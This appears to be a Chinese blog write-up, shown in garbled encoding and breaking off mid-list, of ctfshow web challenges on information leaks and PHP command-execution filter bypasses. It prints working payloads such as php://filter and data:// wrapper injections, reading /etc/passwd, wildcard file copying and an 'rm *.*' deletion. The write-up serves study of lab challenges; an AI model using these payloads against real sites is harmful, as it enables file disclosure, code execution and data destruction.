<h2 id="web11-åŸŸåtxtè®°å½•æ³„éœ²"><a href="#web11-åŸŸåtxtè®°å½•æ³„éœ²" class="headerlink" title="web11 åŸŸåtxtè®°å½•æ³„éœ²"></a>web11 åŸŸåtxtè®°å½•æ³„éœ²</h2><p>é¢˜ç›®æç¤º: åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚flag.ctfshow.comå°±éšè—äº†ä¸€æ¡ä¿¡æ¯<br>è¿™é‡Œå­¦ä¹ åˆ°åˆ©ç”¨DNSæŸ¥è¯¢<br><a href="http://www.jsons.cn/nslookup/" target="_blank">åœ¨çº¿ç½‘ç«™</a>æŸ¥è¯¢å³å¯å¾—åˆ°flag</p>
<h2 id="web12-æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ"><a href="#web12-æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ" class="headerlink" title="web12 æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ"></a>web12 æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ</h2><p>å“‡ å¾ˆæœ‰è¶£çš„é¢˜~<br>åˆ©ç”¨é¢˜ç›®æç¤º åœ¨ä¸‹é¢heaplineæ‰¾åˆ° 372619038 çŒœæµ‹è¿™æ˜¯å¯†ç <br>ä½†æ˜¯æ‰¾äº†åŠå¤©æ‰¾ä¸åˆ°å“ªé‡Œç”¨å¾—ä¸Š<br>çœ‹æç¤º è¯´è¿”å› &#x2F;admin ! å­¦åˆ°äº† ç„¶åä»¥ admin 372619038 ç™»å½•å³å¯å¾—åˆ°flag~</p>
<h2 id="web13-å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²"><a href="#web13-å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²" class="headerlink" title="web13 å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²"></a>web13 å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²</h2><p>è¿™ å±å®æƒ³ä¸åˆ° orz<br>Homeæœ€ä¸‹é¢ä¼šå‘ç°documentå¯ä»¥ç‚¹ï¼ ç„¶åå°±èƒ½ä¸‹è½½å¾—åˆ°pdfâ€¦<br>é‡Œé¢<del>è´´å¿ƒçš„</del>è®°å½•äº†ç™»å½•è·¯å¾„&#x2F;ç”¨æˆ·å&#x2F;å¯†ç â€¦<br>è·Ÿç€è®¿é—®å³å¯å¾—åˆ°flag</p>
<h2 id="web14-ç¼–è¾‘å™¨é…ç½®ä¸å½“"><a href="#web14-ç¼–è¾‘å™¨é…ç½®ä¸å½“" class="headerlink" title="web14 ç¼–è¾‘å™¨é…ç½®ä¸å½“"></a>web14 ç¼–è¾‘å™¨é…ç½®ä¸å½“</h2><p>az è®¿é—® &#x2F;editor (â€¦)<br>è¿›å…¥é‡Œé¢ æ‰¾åˆ°å›¾ç‰‡ä¸Šä¼  å‘ç°å¯ä»¥è®¿é—®æ–‡ä»¶ç©ºé—´ èƒ½çœ‹åˆ°ç½‘ç«™çš„æ‰€æœ‰ä¿¡æ¯<br>ç„¶ååœ¨ &#x2F;var&#x2F;www&#x2F;nothinghereä¸‹æ‰¾åˆ°flagåœ°å€ è®¿é—®&#x2F;nothinghere&#x2F;flagâ€¦txtå³å¯<br>&#x2F;var&#x2F;wwwä¸‹æ”¾ç½®çš„æ˜¯ç«™ç‚¹é…ç½® æ‰€ä»¥ç”¨åé¢åœ°å€æ‰èƒ½è®¿é—®</p>
<h2 id="web15-å¯†ç é€»è¾‘è„†å¼±"><a href="#web15-å¯†ç é€»è¾‘è„†å¼±" class="headerlink" title="web15 å¯†ç é€»è¾‘è„†å¼±"></a>web15 å¯†ç é€»è¾‘è„†å¼±</h2><p>ç½‘ç«™æœ€ä¸‹é¢æ³„éœ²é‚®ç®±å’¯ <a href="mailto:&#49;&#49;&#53;&#54;&#54;&#x33;&#49;&#57;&#x36;&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#49;&#49;&#53;&#54;&#54;&#x33;&#49;&#57;&#x36;&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a> (æ•²å“è­¦é’Ÿï¼ è‡ªå·±ç½‘ç«™ä¹Ÿè¦æ³¨æ„ï¼)<br>è®¿é—® &#x2F;admin å¯†ç å°è¯• 1156631961å‘ç°ä¸å¯¹åŠ² æ€ä¹ˆéƒ½ç™»ä¸è¿›å»<br>åˆå­¦åˆ°éªšæ“ä½œäº† å¿˜è®°å¯†ç  å¯†ä¿æ˜¯åŸå¸‚ é‚£ä¹ˆåˆ©ç”¨QQå·æœç´¢ï¼ï¼ï¼<br>åœ¨è¥¿å®‰ å°±è¡Œäº† orz<br>å¯†ç è¢«é‡ç½®ä¸º admin7789</p>
<h2 id="web16-æ¢é’ˆæ³„éœ²"><a href="#web16-æ¢é’ˆæ³„éœ²" class="headerlink" title="web16 æ¢é’ˆæ³„éœ²"></a>web16 æ¢é’ˆæ³„éœ²</h2><p>ä½ åˆ«è¯´è¿™ç½‘ç«™è¿˜æŒºç‚«çš„ orz<br>?? ä»€ä¹ˆæ˜¯æ¢é’ˆ??? </p>
<p><a href="https://xz.aliyun.com/t/2222#:~:text=%E7%BD%91%E7%AB%99%E6%8E%A2%E9%92%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF,%E5%9C%A8%E5%90%84%E6%96%B0%E5%BB%BA%E7%BD%91%E7%AB%99%E4%B8%8A%E3%80%82">https://xz.aliyun.com/t/2222#:~:text=%E7%BD%91%E7%AB%99%E6%8E%A2%E9%92%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF,%E5%9C%A8%E5%90%84%E6%96%B0%E5%BB%BA%E7%BD%91%E7%AB%99%E4%B8%8A%E3%80%82</a></p>
<p>ä½†æ˜¯è¿™é“é¢˜ è®¿é—® &#x2F;tz.php<br>å‘ç°phpinfo()å¯ä»¥ç‚¹å‡»æŸ¥çœ‹(ä¹Ÿç¬¦åˆä¸Šé¢é“¾æ¥çš„ä»‹ç»)<br>æœç´¢flagå³å¾—</p>
<h2 id="web17-CDNç©¿é€"><a href="#web17-CDNç©¿é€" class="headerlink" title="web17 CDNç©¿é€"></a>web17 CDNç©¿é€</h2><p>é€è¿‡é‡é‡ç¼“å­˜ï¼ŒæŸ¥æ‰¾åˆ°ctfer.comçš„çœŸå®IP<br><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a><br>è¿™é‡Œç›´æ¥pingå³å¯ (åšé¢˜å½’åšé¢˜ è¿˜æ˜¯è¦å¤šå­¦ç‚¹ç›¸å…³çŸ¥è¯†)<br>ä½†æ˜¯è²Œä¼¼ç°åœ¨çš„ipå˜äº†â€¦ æ¯”å¦‚æˆ‘Ping&#x2F;æŸ¥è¯¢ éƒ½å¾—åˆ°çš„æ˜¯ 124.222.110.176 â€¦</p>
<h2 id="web18-jsæ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#web18-jsæ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="web18 jsæ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>web18 jsæ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p>ä¸€ä¸ªå°æ¸¸æˆç•Œé¢ æŸ¥çœ‹æºç  å‘ç°score&gt;101ä¼šå¼¹å‡º <code>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code><br>è§£ç : ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹<br>å±® çš®çˆ±åƒçš®æ˜¯â€™phpâ€™çš„æ„æ€ â€¦ (æƒ³æƒ³ä¹Ÿæ˜¯ é€šå…³åè‚¯å®šå¼¹å‡ºä¸€ä¸ªphpç•Œé¢~)<br>è¡Œå§ è®¿é—® 110.phpå³å¯</p>
<h2 id="web19-å‰ç«¯å¯†é’¥æ³„éœ²"><a href="#web19-å‰ç«¯å¯†é’¥æ³„éœ²" class="headerlink" title="web19 å‰ç«¯å¯†é’¥æ³„éœ²"></a>web19 å‰ç«¯å¯†é’¥æ³„éœ²</h2><p>ä¸€ä¸ªç™»å½•ç•Œé¢ å‰ç«¯æºç ä¸€çœ‹ everthing is hereâ€¦<br>ç»™äº†CBCåŠ å¯†çš„IV KEY å’Œæœ€åçš„passwdåŠ å¯†å€¼ ç›´æ¥decryptå³å¯(å†™çš„æ—¶å€™åˆæŠŠå‚æ•°ä½ç½®å†™åäº†â€¦ key MODE iv)<br>passwd : i_want_a_36d_girl</p>
<h2 id="web20-æ•°æ®åº“æ¶æ„ä¸‹è½½"><a href="#web20-æ•°æ®åº“æ¶æ„ä¸‹è½½" class="headerlink" title="web20 æ•°æ®åº“æ¶æ„ä¸‹è½½"></a>web20 æ•°æ®åº“æ¶æ„ä¸‹è½½</h2><p>é¢˜ç›®æç¤º : mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†<br>æ—©æœŸçš„asp+accessæ˜¯.mdbå½¢å¼ è®¿é—® &#x2F;db&#x2F;db.mdb(è¿™dbå’‹æƒ³åˆ°çš„å•Š orz)<br>ä¸‹è½½å¾—åˆ°æ•°æ®åº“ ğŸ”å³å¯æ‰¾åˆ°flag</p>
<hr>
<hr>
<p>æ€»ç»“: è¿™äº›ç»†ææœ«èŠ‚çš„è€ƒç‚¹æœ‰æ—¶å€™çœŸçš„ä¼šæˆä¸ºå…³é”®ï¼ å½“æºç æ‰¾ä¸åˆ°æ€è·¯ å°è¯•è®¸ä¹…æ— æœæ—¶ è¯•è¯•æ‰¾æ³„éœ²ï¼</p>
<h1 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h1><p>è¿™éƒ¨åˆ†æ²¡ç¯å¢ƒçˆ†ä¸ªé¬¼ğŸ¤£</p>
<h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>åªè¿‡æ»¤äº† flag æ‰€ä»¥å¯ä»¥ç”¨?,* æ¥åŒ¹é…<br>è§†é¢‘æœ‰ä¸ªå¾ˆç§€çš„åšæ³• <code>system(&quot;cp flag.php 1.txt&quot;)</code> ç„¶åç›´æ¥è®¿é—® &#x2F;1.txt !</p>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>è¿‡æ»¤äº† flag system php<br>ç”¨ä¸Šé¢çš„æ–¹æ³•</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`cp fla?.??? 1.txt`</span><br></pre></td></tr></table></figure>
<p>ç„¶åè®¿é—® &#x2F;1.txt</p>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>è¿‡æ»¤äº† flag system php cat sort shell ç‚¹ ç©ºæ ¼ å•å¼•å·<br>è§†é¢‘è¿™æ ·æ‰§è¡Œ:  <code>/?c=eval($_GET[1]);&amp;1=phpinfo();</code> æ³¨æ„phpinfo()ç»“å°¾åˆ†å·!<br>è¿™é‡Œæ˜¯å‚æ•°é€ƒé€¸(è·³æ¿) å­¦åˆ°äº† orz<br>è¿™æ ·çš„è¯ &amp;1&#x3D;åé¢å°±å¯ä»¥ä¼ ä»»æ„å€¼äº†(è„±ç¦»äº†å‚æ•°cçš„çº¦æŸ æ‰€ä»¥ä¸ä¼šè¢«åŒ¹é…åˆ°)<br>è¿™æ · <code>cat flag.php</code>éœ€è¦åœ¨æºä»£ç ä¸­æŸ¥çœ‹<br>è€Œè§†é¢‘åˆç»™äº†ä¸€ç§åšæ³• <code>tac flag.php</code> catåè¿‡æ¥å†™ å°±å¯ä»¥ç›´æ¥çœ‹åˆ°äº†</p>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>è¿‡æ»¤äº† flag system php cat sort shell ç‚¹ ç©ºæ ¼ å•å¼•å· åå¼•å· åˆ†å· æ‹¬å·<br>é¦–å…ˆè¿˜æ˜¯å¯ä»¥ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³• <code>/?c=eval($_GET[1]);&amp;1=phpinfo();</code><br>ç©ºæ ¼è¢«è¿‡æ»¤äº†å¯ä»¥ç”¨urlç¼–ç (ç©ºæ ¼ æ¢è¡Œ éƒ½å¯ä»¥)<br>è¿˜æœ‰ä¸€ä¸ªç‚¹ è¿™é‡Œåˆ†å·è¢«è¿‡æ»¤äº† å¯ä»¥ç”¨ ?&gt;å½¢å¼  (phpæœ€åä¸€æ¡è¯­å¥ä¸éœ€è¦åˆ†å·)<br>è§†é¢‘é‡‡ç”¨äº†include<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code><br>&#x2F;etc&#x2F;passwd ä¹Ÿæ˜¯ä¸€ä¸ªå¸¸è§çš„ç‚¹ å¯ä»¥å¾—åˆ°ä¸€äº›åŸºæœ¬ä¿¡æ¯<br>ç”šè‡³è¿˜å¯ä»¥åŒ…æ‹¬ &#x2F;bin&#x2F;ls äºŒè¿›åˆ¶æ–‡ä»¶ orz<br>æ¥ä¸‹æ¥çš„è·å–flag è§†é¢‘é‡‡ç”¨çš„æ˜¯æ–‡ä»¶åŒ…å«çš„å½¢å¼ (å› ä¸ºæˆ‘ä»¬è¿™é‡Œç”¨çš„include æ— æ³•ç›´æ¥è¾“å‡º)<br><code>/...?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>è¿‡æ»¤äº† flag system php cat sort shell ç‚¹ ç©ºæ ¼ å•å¼•å· echo åå¼•å· åˆ†å· æ‹¬å· åŒå¼•å·<br>ç»§ç»­å­¦ä¹ æ–°å§¿åŠ¿ ç”¨require<br><code>/?c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code><br>æ‰€ä»¥&amp;1&#x3D;åé¢æ¥ä¼ªåè®®å³å¯è¯»å–flag</p>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>è¿‡æ»¤äº† flag system php cat sort shell ç‚¹ ç©ºæ ¼ å•å¼•å· echo åå¼•å· åˆ†å· æ‹¬å· åŒå¼•å· å†’å·<br>å¤šè¿‡æ»¤äº†ä¸€ä¸ªå†’å· æˆ‘å¯»æ€ä¸Šé¢˜æ€è·¯ä¹Ÿèƒ½ç»§ç»­ç”¨å§<br>payload : <code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>è¿™é‡Œè§†é¢‘æ€»ç»“äº†ä¸€ä¸‹ä¸éœ€è¦ä½¿ç”¨æ‹¬å·çš„æƒ…å†µ(è¯­è¨€ç»“æ„) å¸¸ç”¨:</p>
<ul>
<li>echo</li>
<li>print</li>
<li>isset</li>
<li>unset</li>
<li>include</li>
<li>require</li>
</ul>
<p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¿‡æ»¤äº†æ‹¬å·æˆ‘ä»¬çš„includeä»ç„¶å¯ä»¥ç”¨(å‰é¢ç”¨%0aéš”å¼€)<br>è™½è¯´printä¹Ÿèƒ½æ‰§è¡Œ ä½†æ˜¯æ‰“å°å‡ºæ¥çš„ä¸æ˜¯æ•°æ®è€Œæ˜¯flag.phpåç§°â€¦</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>è¿‡æ»¤äº† flag system php cat sort shell ç‚¹ ç©ºæ ¼ å•å¼•å· echo åå¼•å· åˆ†å· æ‹¬å· åŒå¼•å· å†’å· &lt; &#x3D;<br>å¤šè¿‡æ»¤äº† &lt; &#x3D;<br>az ç”±äºæˆ‘ä»¬ç”¨è·³æ¿æŠŠcçš„å½±å“å»æ‰äº† æ‰€ä»¥åªè¦åœ¨ &amp;1&#x3D; å‰é¢ä¸å‡ºç°è¿™äº›å°±è¡Œäº† åé¢è¿˜æ˜¯éšæ„å¡«<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>è¿‡æ»¤äº† flag system php cat sort shell ç‚¹ ç©ºæ ¼ å•å¼•å· echo åå¼•å· åˆ†å· æ‹¬å· åŒå¼•å· å†’å· &lt; &#x3D; &#x2F; [0-9]<br>å¤šè¿‡æ»¤äº† &#x2F; å’Œ 0~9æ•°å­—<br>åªéœ€è¦æŠŠGET[1]æ”¹ä¸ºGET[a]å³å¯<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br>è¿™é‡Œè§†é¢‘ä¹Ÿè¯´æ˜äº†ä¸ºä»€ä¹ˆæˆ‘ä»¬GETé‡Œé¢çš„1,aéƒ½å¯ä»¥ä¸åŠ å¼•å·: phpä¸ºäº†å‘ä¸‹å…¼å®¹ä¿ç•™äº†è¿™ç§å†™æ³•(ğŸ™‡â€)</p>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>å¦ä¸€ç§å½¢å¼:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>å°è¯•ä¼ å…¥ <code>/?c=$_GET[1]?&gt;&amp;1=flag.php</code>å‘ç°ä¸èƒ½å¾—åˆ°flag<br>è¿™æ˜¯å› ä¸ºè¿™æ ·åšåªèƒ½include flag.phpè¿™ä¸ªå­—ç¬¦ä¸² è€Œä¸èƒ½è§£æflag.phpä¸­çš„æ•°æ®å†…å®¹<br>è¿™é‡Œè§†é¢‘ç»™äº†ä¸€ç§ç”¨dataä¼ªåè®®çš„åšæ³•<br>dataä¼ªåè®®ç”¨æ³•:<br><code>data://text/plain,xxx</code><br>ä¼šæŠŠxxxå­—ç¬¦ä¸²ä½œä¸ºå‘½ä»¤æ‰§è¡Œ<br>æ¯”å¦‚ <code>data://text/plain,&lt;?php phpinfo(); ?&gt;</code><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨shellä¸­çš„?åŒ¹é…æ¥ç»•è¿‡flagçš„è¿‡æ»¤<br>å§¿åŠ¿å¾ˆå¤š è§†é¢‘åˆç”¨äº†cp ğŸ˜„<br><code>/?c=data://text/plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;); ?&gt;</code> è¿™æ ·ä»¥åè®¿é—® &#x2F;1.txtå³å¯<br>ä½†æœ‰ä¸ªç–‘é—® ä¸ºä»€ä¹ˆæˆ‘ç¬¬ä¸€æ¬¡mv æ“ä½œååé¢ä¸ç®¡ç”¨mv è¿˜æ˜¯cpéƒ½æ— æ³•ç»§ç»­æ“ä½œäº†?<br>å†æ¬¡å¤ç°å‘ç°ç¡®å®mväº†è¿‡ååŸæ¥çš„flag.phpå°±æ²¡äº† å†cpå°±æ— æ•ˆäº†<br>ç„¶åå‘ç° <code>rm *.*</code> èƒ½åˆ æ‰æ‰€æœ‰ğŸ˜„</p>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>è¿‡æ»¤äº† flag php file<br>è¿™é‡Œè¿‡æ»¤äº†phpå°±ä¸èƒ½åƒä¸Šé¢é‚£æ · <?php xxx ?>äº†<br>çœ‹è§†é¢‘è¯´æŠŠ<?php >æ”¹ä¸º <?= >å°±è¡Œäº†(çŸ­æ ‡ç­¾)
ä¸€è¯•è¿˜çœŸè¡Œ orz
è¿™æ ·å°±å¯ä»¥ç”¨systemæ¥æ‰§è¡Œäº†
`/?c=data://text/plain,<?= system("tac fla?.???"); ?><code>å½“ç„¶ä¹Ÿå¯ä»¥è¿™ç§æ–¹å¼:</code>&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("cp fl*.* 22.txt"); ?>&#96;(è¿™ä¹ˆä¸€çœ‹*é€šé…ç¬¦æ¯”?å¥½ç”¨ç‚¹ orz)</p>
<hr>
<hr>
<p>æ‰€ä»¥å†çœ‹çœ‹37,38å‘ç°å¹¶æ²¡æœ‰ç”¨åˆ°ç¬¬äºŒè¡Œçš„ <code>echo $flag</code> éƒ½æ˜¯ç›´æ¥åˆ©ç”¨include+dataä¼ªåè®®ç›´æ¥å‘½ä»¤æ‰§è¡Œäº†</p>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>åˆæ˜¯ä¸€ç§æ–°å½¢å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘çš„ç¬¬ä¸€æ€è·¯è¿˜æ˜¯é‡‡å–dataä¼ªåè®®æ¥å‘½ä»¤æ‰§è¡Œ æœ€ååŠ çš„.phpåç¼€åˆ©ç”¨%20æˆªæ–­å³å¯<br><code>/?c=data://text/plain,&lt;?= system(&quot;tac *.*&quot;) ?&gt;%20</code><br>ç„¶åçœ‹è§†é¢‘å¥½åƒä¸æˆªæ–­ä¹Ÿä¸ä¼šå½±å“å‰é¢çš„ä»£ç æ‰§è¡Œ åªæ˜¯ä¼šåŠ ä¸Šä¸€è¡Œå›æ˜¾ xxx.phpç½¢äº†(xxxæ˜¯å‰é¢å‘½ä»¤æ‰§è¡Œçš„è¿”å›å€¼)</p>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>è¿‡æ»¤äº†å¥½å¤š </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå‰©ä¸‹äº†å­—æ¯ åˆ†å· ä¸‹åˆ’çº¿ç­‰(å…¶å®é¢˜ç›®è¿‡æ»¤çš„æ˜¯ä¸­æ–‡æ‹¬å·ï¼ï¼ï¼)<br>emmm å®Œå…¨ä¸ä¼š~ å­¦ä¹ ä¸€ä¸‹<br>çœ‹hint:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))); GXYCTFçš„ç¦æ­¢å¥—å¨ƒ é€šè¿‡cookieè·å¾—å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure>
<h3 id="solution1"><a href="#solution1" class="headerlink" title="solution1"></a>solution1</h3><p>payload: <code>/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code> å¯ä»¥å¾—åˆ°flag<br>æˆ–è€… <code>/?c=show_source(next(array_reverse(scandir(getcwd()))));</code><br>å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥æŠŠ <code>show_source</code> æ”¹ä¸º <code>echo highlight_file</code> (è¿™æ—¶å›æ˜¾æ˜¯flagåè·Ÿäº†ä¸€ä¸ª1)<br>orz tql å…ˆæ”¾è¿™</p>
<ul>
<li>getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())</li>
<li>localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€</li>
<li>pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</li>
<li>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·</li>
<li>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½•</li>
<li>array_reverse():æ•°ç»„é€†ç½®</li>
<li>next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</li>
<li>show_source():æŸ¥çœ‹æºç </li>
<li>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚</li>
</ul>
<h3 id="solution2"><a href="#solution2" class="headerlink" title="solution2"></a><del>solution2</del></h3><p>é¢˜ç›®æç¤ºè¿˜ç»™äº†ä¸€ç§æ–¹æ³•<br>å…ˆä¼ payload:  <code>/?c=session_start();system(session_id());</code><br>ç„¶åæ‰¾åˆ°PHPSESSID å°†å€¼ä¿®æ”¹ä¸º ls(bpæŠ“åŒ…ä¿®æ”¹ä¹Ÿè¡Œ) å°±å¯ä»¥æ‰§è¡Œ system(â€œlsâ€)! orz å¤ªç§€äº†å§â€¦<br>ä½†æ˜¯å‘¢ è¿™æ ·æ‹¿ä¸åˆ°flag.phpçš„å€¼ è¿™æ ·æ”¹äº†ä¼ è¿‡åPHPSESSIDä¹Ÿå˜äº†(ä½†è¿™ç§ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆæœ‰è¶£é¢æ€è·¯)</p>
<h3 id="solution3"><a href="#solution3" class="headerlink" title="solution3"></a>solution3</h3><p>è§†é¢‘ç»™äº†å¦å¤–çš„æ–¹æ³•<br>ä¹Ÿå­¦ä¹ åˆ°äº†å¾ˆå¤šæ–°ä¸œè¥¿</p>
<ul>
